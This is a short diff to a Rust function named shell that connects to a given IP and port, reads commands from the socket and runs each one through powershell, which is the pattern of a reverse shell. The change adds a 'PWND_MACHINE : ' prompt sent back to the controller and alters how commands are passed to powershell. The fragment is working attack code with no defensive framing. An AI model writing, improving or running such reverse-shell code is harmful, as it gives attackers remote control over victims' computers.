@@ -69,6 +69,7 @@ pub fn shell(ip: &str, port: &str) -> Result<()> {
     let mut buffer = [0; 2048];
 
     loop {
+        stream.write(b"PWND_MACHINE : ");
         let buf_len = stream.read(&mut buffer).unwrap();
         let command = from_utf8(&buffer[0..buf_len-1]).unwrap();
     
@@ -77,7 +78,7 @@ pub fn shell(ip: &str, port: &str) -> Result<()> {
         }
         
         let output = Command::new("powershell")
-                .args(&["/C", &command])
+                .args(&[&command])
                 .output()
                 .expect("failed to execute the process");
 
